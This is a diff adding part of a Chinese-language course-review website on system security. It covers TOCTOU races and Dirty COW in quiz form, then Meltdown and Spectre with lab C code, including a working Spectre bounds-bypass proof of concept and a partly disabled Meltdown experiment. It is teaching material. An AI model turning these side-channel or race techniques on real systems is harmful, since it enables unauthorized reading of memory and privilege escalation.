+      <li>Dirty COW 的“写成功”有欺骗性：私有映射里的改动不等于文件被改，必须看落盘结果。</li>
+      <li>保护开关是 <code>fs.protected_symlinks</code>，0 关 1 开；默认在 <code>/tmp</code> 这类全局可写目录上开启。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 10 章<span>4 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="TOCTOU 指检查时刻（check）与使用时刻（use）之间对象可能被替换，导致检查结论与实际情况不符。">
+        <div class="q-stem"><span class="qno">1.</span>TOCTOU 指的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q10-1" value="A"><span>A. 两个线程同时写同一内存</span></label>
+          <label class="opt"><input type="radio" name="q10-1" value="B"><span>B. 检查与使用之间存在时间窗口，对象可被替换</span></label>
+          <label class="opt"><input type="radio" name="q10-1" value="C"><span>C. 缓存与内存数据不一致</span></label>
+          <label class="opt"><input type="radio" name="q10-1" value="D"><span>D. 编译器优化导致的乱序执行</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="漏洞窗口就在 access() 检查通过之后、fopen() 打开之前；攻击者在这段时间把 /tmp/mylink 换成指向 /etc/passwd 的符号链接。">
+        <div class="q-stem"><span class="qno">2.</span>vulp_race_condition.c 的漏洞窗口位于？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q10-2" value="A"><span>A. access() 与 fopen() 之间</span></label>
+          <label class="opt"><input type="radio" name="q10-2" value="B"><span>B. scanf() 与 access() 之间</span></label>
+          <label class="opt"><input type="radio" name="q10-2" value="C"><span>C. fwrite() 与 fclose() 之间</span></label>
+          <label class="opt"><input type="radio" name="q10-2" value="D"><span>D. main() 返回之后</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="文件注释写明：fs.protected_symlinks=0 关闭保护，=1 开启保护；/tmp 全局可写，默认开启。">
+        <div class="q-stem"><span class="qno">3.</span><code>sysctl -w fs.protected_symlinks=0</code> 的作用是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q10-3" value="A"><span>A. 关闭符号链接保护，使攻击脚本可以随意替换链接</span></label>
+          <label class="opt"><input type="radio" name="q10-3" value="B"><span>B. 开启 ASLR</span></label>
+          <label class="opt"><input type="radio" name="q10-3" value="C"><span>C. 设置 SUID 位</span></label>
+          <label class="opt"><input type="radio" name="q10-3" value="D"><span>D. 禁止写入 /tmp</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="Dirty COW 的武器化依靠两个动作反复竞争：madvise(MADV_DONTNEED) 丢弃私有页迫使回到文件页，同时向 /proc/self/mem 写入。">
+        <div class="q-stem"><span class="qno">4.</span>cow_attack_password.c 里两个线程分别做什么？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q10-4" value="A"><span>A. 一个 fork 子进程，一个等待信号</span></label>
+          <label class="opt"><input type="radio" name="q10-4" value="B"><span>B. 一个读 /etc/shadow，一个改 /etc/passwd</span></label>
+          <label class="opt"><input type="radio" name="q10-4" value="C"><span>C. 一个反复 madvise(MADV_DONTNEED)，一个反复向 /proc/self/mem 写入</span></label>
+          <label class="opt"><input type="radio" name="q10-4" value="D"><span>D. 一个建符号链接，一个删符号链接</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 11 章 ================= -->
+  <section class="chapter" id="ch11">
+    <div class="ch-kicker">第 11 章 · 课件未展开；代码来自 Meltdwon_specture/</div>
+    <h1>Meltdown 与 Spectre</h1>
+    <p class="lead">这一章不讲“改内存”，而讲“<strong>偷看内存</strong>”：CPU 会乱序执行、会猜分支，猜错后架构状态会回滚，但<em>缓存状态不会</em>。攻击者用“读缓存要多久”这一条侧信道，把回滚前碰过的机密一位一位地测出来。</p>
+
+    <div class="callout warn">
+      <b>来源说明</b>
+      本批课件（第 0、1 讲与第 2 讲 1/2-1/2-2/2-3）<strong>没有任何 Meltdown/Spectre 的讲解页</strong>，课程大纲也只列到“控制流完整性”与“竞态条件”。以下内容完全依据 <code>Meltdwon_specture/</code> 下的 6 个 C 文件与注释整理；CPU 微架构层面的背景（乱序窗口大小、TSX 等）课件未涉及，不写成结论。
+    </div>
+
+    <h2>11.1 先修课：Flush + Reload 怎么测缓存</h2>
+    <p>缓存命中时读取只需几十个周期，未命中要几百个。先把探测数组从缓存里刷掉（<code>_mm_clflush</code>），执行可疑操作，再逐个计时读取：<strong>哪个元素快，就说明它刚被放进过缓存</strong>。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/FlushReload.c · 第 3–32 行</span><span>C</span></div>
+      <pre data-lang="c">uint8_t array[10*4096];
+
+int main(int argc, const char **argv) {
+  int junk=0;
+  register uint64_t time1, time2;
+  volatile uint8_t *addr;
+  int i;
+
+  // Initialize the array
+  for(i=0; i&lt;10; i++) array[i*4096]=1;
+
+  // FLUSH the array from the CPU cache
+  for(i=0; i&lt;10; i++) _mm_clflush(&amp;array[i*4096]);
+
+  // Access some of the array items
+  array[3*4096] = 100;
+  array[7*4096] = 200;
+
+  for(i=0; i&lt;10; i++) {
+    addr = &amp;array[i*4096];
+    time1 = __rdtscp(&amp;junk);
+    junk = *addr;
+    time2 = __rdtscp(&amp;junk) - time1;
+    printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
+  }
+  return 0;
+}</pre>
+    </div>
+    <p>运行结果应是第 3、7 个元素访问时间明显更短（其余约数百周期）。<code>__rdtscp</code> 读时间戳计数器，<code>volatile</code> 防止编译器优化掉访问。</p>
+    <div class="callout">
+      <b>为什么步长是 4096</b>
+      4096 是一页的大小（<code>getconf PAGESIZE</code>），缓存行通常 64 字节（<code>cat /sys/devices/system/cpu/cpu1/cache/index0/coherency_line_size</code>）。按页跨开可以让每个元素落在不同页/不同缓存行，避免预取或同一 cache line 相互干扰；<code>DELTA=1024</code> 再偏移，进一步错开。
+    </div>
+
+    <h2>11.2 前提：内核地址不能直接读</h2>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/access_kernel.c · 第 3–8 行</span><span>C</span></div>
+      <pre data-lang="c">int main(){
+	char * kerner_data_addr = (char *) 0xfb61b000;
+	char kerner_data = *kerner_data_addr;
+	printf("I have reached here!\n");
+	return 0;
+}</pre>
+    </div>
+    <p>用户态直接解引用内核地址会触发 SIGSEGV，进程被杀，<code>printf</code> 永远执行不到。这也是 <code>exceptionhandling.c</code> 存在的理由：用 <code>sigsetjmp/siglongjmp</code> 把异常“接住”，让程序在崩溃点之后继续跑。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/exceptionhandling.c · 第 5–36 行</span><span>C</span></div>
+      <pre data-lang="c">static sigjmp_buf jbuf;
+
+static void catch_segv()
+{
+  // Roll back to the checkpoint set by sigsetjmp().
+  siglongjmp(jbuf, 1);
+}
+
+int main()
+{
+  unsigned long kernel_data_addr = 0xf9df1000;
+
+  signal(SIGSEGV, catch_segv);
+
+  if (sigsetjmp(jbuf, 1) == 0) {
+     char kernel_data = *(char*)kernel_data_addr;
+     printf("Kernel data at address %lu is: %c\n",
+                    kernel_data_addr, kernel_data);
+  }
+  else {
+     printf("Memory access violation!\n");
+  }
+
+  printf("Program continues to execute.\n");
+  return 0;
+}</pre>
+    </div>
+
+    <h2>11.3 Meltdown：异常之前的那一步已经发生了</h2>
+    <p>CPU 允许后续指令在异常确定之前“先执行”，一旦异常提交，寄存器等架构状态回滚——但被访问过的数据<strong>已经进了缓存</strong>。于是：</p>
+    <ol>
+      <li>读一个无权访问的内核地址（会异常）；</li>
+      <li>用读到的值作为下标，访问探测数组 <code>array[值 * 4096 + DELTA]</code>（这一步也在异常提交前被推测执行）；</li>
+      <li>异常处理把控制流拉回，架构状态回滚；</li>
+      <li>用 Flush+Reload 扫描 <code>array</code>，命中哪一格，就说明内核字节的值是多少。</li>
+    </ol>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/MeltdownExperiment.c · 第 49–84 行</span><span>C</span></div>
+      <pre data-lang="c">void meltdown(unsigned long kernel_data_addr)
+{
+  char kernel_data = 1;
+
+  // The following statement will cause an exception
+  //kernel_data = *(char*)kernel_data_addr;
+  //array[kernel_data * 4096 + DELTA] += 1;
+  array[3 * 4096 + DELTA] += 1;
+}
+
+static sigjmp_buf jbuf;
+static void catch_segv()
+{
+  siglongjmp(jbuf, 1);
+}
+
+int main()
+{
+  signal(SIGSEGV, catch_segv);
+  flushSideChannel();
+
+  if (sigsetjmp(jbuf, 1) == 0) {
+     meltdown(0xf9df1000);
+  }
+  else {
+      printf("Memory access violation!\n");
+  }
+
+  reloadSideChannel();
+  return 0;
+}</pre>
+    </div>
+    <p>注意第 53–56 行：<strong>真正的两行被注释掉了</strong>，只剩 <code>array[3*4096+DELTA] += 1</code>。所以这份代码默认跑出来“只有第 3 格命中”，它是<strong>教学用的对照版本</strong>——把注释去掉才是完整的 Meltdown 步骤。阈值在这里是 <code>#define CACHE_HIT_THRESHOLD (80)</code>。</p>
+    <div class="callout warn">
+      <b>课件未展开</b>
+      本批素材没有解释 Meltdown 受影响的 CPU 型号、KPTI 缓解措施、以及为什么现代 CPU 上直接跑不出效果。文件注释只给了编译命令 <code>gcc MeltdownExperiment.c -march=native -o MeltdownExperiment</code>。这些背景请以官方资料为准，本站不补成定论。
+    </div>
+
+    <h2>11.4 Spectre：骗过边界检查</h2>
+    <p>受害函数有一个完全正确的边界检查：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/SpectreAttackImproved.c · 第 9–27 行</span><span>C</span></div>
+      <pre data-lang="c">unsigned int bound_lower = 0;
+unsigned int bound_upper = 9;
+uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
+char *secret = "Some Secret Value";
+uint8_t array[256*4096];
+
+uint8_t restrictedAccess(size_t x)
+{
+  if (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) {
+     return buffer[x];
+  } else {
+     return 0;
+  }
+}</pre>
+    </div>
+    <p>正常传入越界下标会返回 0。但如果 CPU 在<strong>分支结果尚未确定</strong>时先按“历史预测”执行了分支内部的 <code>buffer[x]</code>，就会把 <code>buffer + x</code> 处的内存读进寄存器（x 可以指向旁边的 <code>secret</code>）。接下来：</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/SpectreAttackImproved.c · 第 55–77 行</span><span>C</span></div>
+      <pre data-lang="c">void spectreAttack(size_t index_beyond)
+{
+  int i;
+  uint8_t s;
+  volatile int z;
+
+  for (i = 0; i &lt; 256; i++)  { _mm_clflush(&amp;array[i*4096 + DELTA]); }
+
+  // Train the CPU to take the true branch inside victim().
+  for (i = 0; i &lt; 10; i++) {
+    restrictedAccess(i);
+  }
+
+  // Flush bound_upper, bound_lower, and array[] from the cache.
+  _mm_clflush(&amp;bound_upper);
+  _mm_clflush(&amp;bound_lower);
+  for (i = 0; i &lt; 256; i++)  { _mm_clflush(&amp;array[i*4096 + DELTA]); }
+  for (z = 0; z &lt; 100; z++)  {  }
+
+  // Ask victim() to return the secret in out-of-order execution.
+  s = restrictedAccess(index_beyond);
+  array[s*4096 + DELTA] += 88;
+}</pre>
+    </div>
+    <p>三个动作缺一不可：</p>
+    <ul>
+      <li><strong>训练</strong>：用合法下标 0–9 调用 10 次，让分支预测器相信“这次也会走 true 分支”；</li>
+      <li><strong>刷缓存</strong>：把 <code>bound_upper/bound_lower</code> 也刷掉，使得比较需要等内存，推测窗口更长；</li>
+      <li><strong>触发</strong>：传入越界下标，推测执行读出的机密值 <code>s</code> 被用来索引 <code>array</code>（<code>s*4096 + DELTA</code>），留下缓存痕迹。</li>
+    </ul>
+    <p>主函数里，越界下标不是随便取的：<code>index_beyond = (size_t)(secret - (char*)buffer)</code>，正好让 <code>buffer[index_beyond]</code> 落在 <code>secret</code> 上。然后重复 1000 轮“攻击 + 重载”，用 <code>scores[]</code> 统计每个下标命中的次数，取最大者即猜测的字符。</p>
+    <div class="code-block">
+      <div class="code-head"><span class="src">Meltdwon_specture/SpectreAttackImproved.c · 第 38–53 行、79–102 行</span><span>C</span></div>
+      <pre data-lang="c">static int scores[256];
+void reloadSideChannelImproved()
+{
+  int i;
+  volatile uint8_t *addr;
+  register uint64_t time1, time2;
+  int junk = 0;
+  for (i = 0; i &lt; 256; i++) {
+    addr = &amp;array[i * 4096 + DELTA];
+    time1 = __rdtscp(&amp;junk);
+    junk = *addr;
+    time2 = __rdtscp(&amp;junk) - time1;
+    if (time2 &lt;= CACHE_HIT_THRESHOLD)
+      scores[i]++; /* if cache hit, add 1 for this value */
+  }
+}
+
+int main() {
+  size_t index_beyond = (size_t)(secret - (char*)buffer);
+  flushSideChannel();
+  for(i=0;i&lt;256; i++) scores[i]=0;
+  for (i = 0; i &lt; 1000; i++) {
+    spectreAttack(index_beyond);
+    usleep(500);
+    reloadSideChannelImproved();
+  }
+  ...
+  printf("The secret value is %d(%c)\n", max, max);</pre>
+    </div>
+    <p>这里的阈值是 <code>150</code>，数组是 <code>256*4096</code>（一个字节 0–255 各占一页）。文件注释还提醒：main 里那行看似无用的 <code>//printf("*****\n");</code> 是让攻击成功所必需的——它改变时序，使推测窗口稳定命中。</p>
+
+    <h3>易错点 / 考点</h3>
+    <ul>
+      <li>两种攻击的差别：Meltdown 利用“异常提交前的推测执行”，Spectre 利用“分支预测错误前的推测执行”，但都靠<strong>缓存侧信道</strong>外带数据。</li>
+      <li><code>_mm_clflush</code> 是把数据逐出缓存，<code>__rdtscp</code> 是计时；只做其一都测不出来。</li>
+      <li>探测数组步长 4096（页大小）是为了错开缓存行/页，不是随便取的常数。</li>
+      <li>Meltdown 的“读内核”与 Spectre 的“读同进程的 secret”是两种不同的越权模型，别混为一谈。</li>
+    </ul>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 11 章<span>4 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="Flush+Reload 通过 rdtscp 计时比较访问耗时：命中缓存的元素明显更快，据此判断哪一块内存被访问过。">
+        <div class="q-stem"><span class="qno">1.</span>Flush+Reload 侧信道靠什么判断“被访问过”？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q11-1" value="A"><span>A. 比较内存内容的哈希</span></label>
+          <label class="opt"><input type="radio" name="q11-1" value="B"><span>B. 比较访问耗时（缓存命中更快）</span></label>
+          <label class="opt"><input type="radio" name="q11-1" value="C"><span>C. 读取 CPU 温度</span></label>
+          <label class="opt"><input type="radio" name="q11-1" value="D"><span>D. 统计页错误次数</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="C" data-explain="4096 是页大小，按页跨开可以让每个下标落在不同页/不同缓存行，避免预取和同一 cache line 的相互干扰。">
+        <div class="q-stem"><span class="qno">2.</span>探测数组为什么用 <code>array[i*4096 + DELTA]</code> 这样的步长？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q11-2" value="A"><span>A. 因为 4096 是数组长度上限</span></label>
+          <label class="opt"><input type="radio" name="q11-2" value="B"><span>B. 为了节省内存</span></label>
+          <label class="opt"><input type="radio" name="q11-2" value="C"><span>C. 为了让每个元素落在不同页/缓存行，避免干扰</span></label>
+          <label class="opt"><input type="radio" name="q11-2" value="D"><span>D. 因为 4096 是最大随机数</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="Meltdown 的关键是：越权读取触发异常，但在异常提交前，后续的推测执行已经把机密值用于索引探测数组，缓存状态不会随架构状态回滚。">
+        <div class="q-stem"><span class="qno">3.</span>Meltdown 的基本原理是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q11-3" value="A"><span>A. 异常提交前的推测执行留下了缓存痕迹</span></label>
+          <label class="opt"><input type="radio" name="q11-3" value="B"><span>B. 内核把数据主动复制到用户空间</span></label>
+          <label class="opt"><input type="radio" name="q11-3" value="C"><span>C. 利用符号链接替换文件</span></label>
+          <label class="opt"><input type="radio" name="q11-3" value="D"><span>D. 通过格式串读取栈</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="先以合法下标 0–9 调用 10 次，让分支预测器偏向“条件成立、走 true 分支”，之后传入越界下标时 CPU 才会推测执行 buffer[x]。">
+        <div class="q-stem"><span class="qno">4.</span>Spectre 里 <code>for (i=0;i&lt;10;i++) restrictedAccess(i);</code> 的目的是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q11-4" value="A"><span>A. 初始化 buffer 内容</span></label>
+          <label class="opt"><input type="radio" name="q11-4" value="B"><span>B. 训练分支预测器，使其预测会走 true 分支</span></label>
+          <label class="opt"><input type="radio" name="q11-4" value="C"><span>C. 清空缓存</span></label>
+          <label class="opt"><input type="radio" name="q11-4" value="D"><span>D. 制造 SIGSEGV</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 附录 ================= -->
+  <section class="chapter" id="appendix">
+    <div class="ch-kicker">附录 · 素材清单与章节映射</div>
+    <h1>素材清单与章节映射</h1>
+    <p class="lead">这一页回答“每个文件去哪了”。左侧是原始文件，右侧是它在站内的落点；未使用的文件也列出原因，避免让人以为漏读。</p>
+
+    <h2>A.1 文件类型与数量</h2>
+    <p>源目录 <code>D:\gpt\系统安全</code> 共 <strong>144 个文件</strong>（不含本站新增的 <code>learn-site</code>），统计如下：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>类型</th><th>数量</th><th>说明</th></tr>
+        <tr><td>无扩展名</td><td>70</td><td>预编译 x86 可执行文件、badfile 样本、目录等（<code>stack</code>、<code>shellcode</code>、<code>badfile</code> 等）</td></tr>
+        <tr><td>.c</td><td>40</td><td>课堂示例、漏洞程序、攻击程序、演示程序</td></tr>
+        <tr><td>.s</td><td>9</td><td>gcc -S 生成的汇编，用于对照栈帧与编译产物</td></tr>
+        <tr><td>.pdf</td><td>8</td><td>第 0 讲、第 1 讲、第 2 讲（1 / 2-1 / 2-2 / 2-3 / 2-4）与虚拟机镜像手册</td></tr>
+        <tr><td>.py</td><td>4</td><td>badfile 生成脚本（stack / ret2libc / rop / finddistance）</td></tr>
+        <tr><td>.py 之外脚本</td><td>.sh ×2</td><td><code>brute_force_ASLR.sh</code>、<code>racecondition/loop.sh</code></td></tr>
+        <tr><td>.html</td><td>2</td><td>前次整理的格式化字符串图解、以及本站 index.html（不计入 144）</td></tr>
+        <tr><td>其他</td><td>.ok ×2；.bkup/.bk/.ok-20241023 各 1；.md 1；.rar 1；.o 1；.i 1</td><td>SEED 实验提交标记、备份文件、README、压缩包、目标文件与预处理产物</td></tr>
+      </table>
+    </div>
+    <p style="color:var(--muted);font-size:14px">口径说明：<code>learn-site/</code> 内的 index.html、style.css、highlight.js、app.js 是本次新增，未计入源目录统计。</p>
+
+    <h2>A.2 课件 → 章节</h2>
+    <div class="table-wrap matrix">
+      <table>
+        <tr><th>源文件</th><th>页数 / 核心内容</th><th>站内章节</th></tr>
+        <tr><td>第0讲 系统安全课程安排-20261012.pdf</td><td>考核比例、48 课时地图、参考资料</td><td>第 1 章</td></tr>
+        <tr><td>第1讲 信息安全概论-.pdf</td><td>安全形势与事件、信用卡案例、西工大事件、攻击五环节、定义 1.1–1.17、CIA、策略/模型/机制、八大原则、防护原则</td><td>第 2 章</td></tr>
+        <tr><td>第2讲 软件安全1.pdf</td><td>四类失真点、编译器 bug 与差分/蜕变测试、gcc 四阶段、ELF、内存布局、寄存器/EFLAGS、cdecl、栈帧、序言结语、longjmp</td><td>第 3 章</td></tr>
+        <tr><td>第2讲 软件安全2-1.pdf</td><td>缓冲区溢出、危险函数、偏移 108/112、控制劫持三法、堆/BSS 溢出、整数溢出（catvars、memcpy、password）</td><td>第 4 章、第 5 章</td></tr>
+        <tr><td>第2讲 软件安全2-2.pdf</td><td>格式串说明符、位置参数、%n、任意读/写、qiang.c、str_fmt_attack、DoS、格式串溢出、shellcode</td><td>第 6 章</td></tr>
+        <tr><td>第2讲 软件安全2-3.pdf</td><td>防御四路线、NX/DEP、canary/StackGuard、StackShield、SafeStack、PointGuard、ASLR、PIE、GOT/PLT、CFI、暴力破解</td><td>第 7 章</td></tr>
+        <tr><td>第2讲 软件安全2-4.pdf</td><td>104 页：NX 绕过设问（2、9–10）、libc.so 与 system（11–13）、ret2libc 逐帧（14–31）、Task A/B/C（32–41）、程序名影响环境变量（46–47）、ROP 与 gadget（49–76）、ROPgadget 与偏移（79–90）、execve 链（92–101）、总结（103）</td><td>第 7 章 7.14、第 8 章 8.5–8.9、第 9 章 9.5–9.8</td></tr>
+        <tr><td>___虚拟机镜像.pdf</td><td>SEED VirtualBox 使用手册</td><td>第 1 章 1.4</td></tr>
+        <tr><td>formattingString漏洞-图解讲解-v2.html</td><td>前次整理的交互式图解</td><td>第 6 章“延伸阅读”（未复制，保留原文件）</td></tr>
+      </table>
+    </div>
+
+    <h2>A.3 代码目录 → 章节</h2>
+    <div class="table-wrap matrix">
+      <table>
+        <tr><th>目录</th><th>文件（摘）</th><th>讲什么</th><th>站内章节</th></tr>
+        <tr><td>compile-42/</td><td>42.c、42.i、42.s、42.o、42</td><td>编译四阶段与 answer 函数汇编</td><td>第 3 章</td></tr>
+        <tr><td>bufferoverflow/</td><td>stack.c、stack.s、stack_exploit.py、shellcode.c、protection.c、ASLR.c、GOT.c、PIE.c、brute_force_ASLR.sh</td><td>栈溢出、shellcode、canary、ASLR/PIE/GOT、暴力破解</td><td>第 4、7 章</td></tr>
+        <tr><td>formattingString/</td><td>qiang.c、new_qiang.c、str_fmt_attack.c、int_fmt_attack.c、write.c、print.c、dumpStack.c、arbitraryRead.c、parameterofPrintf.c、savedparameters.c</td><td>任意读/写、%n、格式串溢出的各种演示变体</td><td>第 6 章</td></tr>
+        <tr><td>intOveflow-codes/</td><td>intOverflow.c、23.c、memcpy.c、password.c</td><td>无符号回绕、长度检查绕过、有符号/无符号混用</td><td>第 5 章</td></tr>
+        <tr><td>returntolibc/</td><td>returntolibc_stack.c、returntolibc_exploit.py、envro.c、systemexit.c、pro_epi_logue.c/.s</td><td>ret2libc 布局、环境变量定位 /bin/sh</td><td>第 3、8 章</td></tr>
+        <tr><td>rop/</td><td>stack.c、exploit.py、finddistance.py、test_execve.c</td><td>gadget 链、偏移定位、静态编译</td><td>第 9 章</td></tr>
+        <tr><td>racecondition/</td><td>vulp_race_condition.c、attack_race_condition.c、loop.sh、passwd_input</td><td>符号链接 TOCTOU</td><td>第 10 章</td></tr>
+        <tr><td>racecondition/cow/</td><td>readonly.c、cow_attack_password.c、zzz</td><td>COW 私有映射与 Dirty COW</td><td>第 10 章</td></tr>
+        <tr><td>Meltdwon_specture/</td><td>cachetime.c、FlushReload.c、access_kernel.c、exceptionhandling.c、MeltdownExperiment.c、SpectreAttackImproved.c</td><td>缓存侧信道、异常处理、Meltdown/Spectre</td><td>第 11 章</td></tr>
+      </table>
+    </div>
+
+    <h2>A.4 未纳入正文的文件与原因</h2>
+    <ul>
+      <li><strong>无扩展名可执行文件（约 70 个）</strong>：属于编译产物或实验样本，内容与对应 .c 重复，故不逐一讲解；本章节中的“运行前提”已覆盖它们的编译方式。</li>
+      <li><strong>.ok / .bkup / .bk / .ok-20241023</strong>：SEED 实验的提交/备份标记，无教学信息。</li>
+      <li><strong>系统安全课程-代码-20261020.rar</strong>：与 <code>codes-share-to-class</code> 内容重复的打包件，未解压。</li>
+      <li><strong>README.md</strong>：目录说明，未作为正文来源。</li>
+      <li><strong>formattingString 的若干变体（new_qiang.c、dumpStack.c、arbitraryRead.c、savedparameters.c、print.c）</strong>：是同一原理的不同演示，正文只取有代表性的 qiang.c、write.c 与 str_fmt_attack.c，避免重复。</li>
+    </ul>
+
+    <h2>A.5 已知缺口</h2>
+    <div class="callout warn">
+      <b>素材缺口，不做补写</b>
+      <ul style="margin:8px 0 0">
+        <li>竞态条件、Dirty COW、Meltdown/Spectre 在课件中的<strong>讲解页缺失</strong>，相关章节以代码为主，凡代码无法证明的原理均标注“课件未展开”。ret2libc 与 ROP 已由 2-4 补齐（第 8、9 章）。</li>
+        <li>课程目录中的“安全模型与机制、操作系统安全、虚拟化安全、云计算安全、IoT 安全、协议安全与形式化分析”等主题<strong>没有对应课件</strong>，本站不设章节。</li>
+        <li><code>protection.c</code> 的偏移 68、<code>rop/stack.c</code> 的偏移 24 均为特定编译选项下的实测值，换编译器/选项后必须重量。</li>
+      </ul>
+    </div>
+
+    <h2>A.6 使用与校验说明</h2>
+    <ul>
+      <li>站点不加载任何外部资源：样式、脚本、高亮均为 <code>learn-site/assets/</code> 下的本地文件，断网可用。</li>
+      <li>代码高亮是本站自写的轻量分词器（非 highlight.js），只做关键字/字符串/数字/注释着色，不追求完整语法解析。</li>
+      <li>进度与主题写在 localStorage；清除站点数据会一并清除。</li>
+      <li>原文与代码均未修改；源目录中新增的只有 <code>learn-site/</code> 目录。</li>
+    </ul>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  </div>
+  </main>
+</div>
+
+<footer class="site-foot">
+  学习站依据 <code>D:\gpt\系统安全</code> 下课件与课堂代码整理，仅供课程复习；原始文件未做任何修改。<br>
+  代码片段均标注来源文件与行号，运行实验前请先阅读各章“运行前提”。
+</footer>
+
+<script src="assets/highlight.js"></script>
+<script src="assets/gloss-data.js"></script>
+<script src="assets/app.js"></script>
+</body>
+</html>
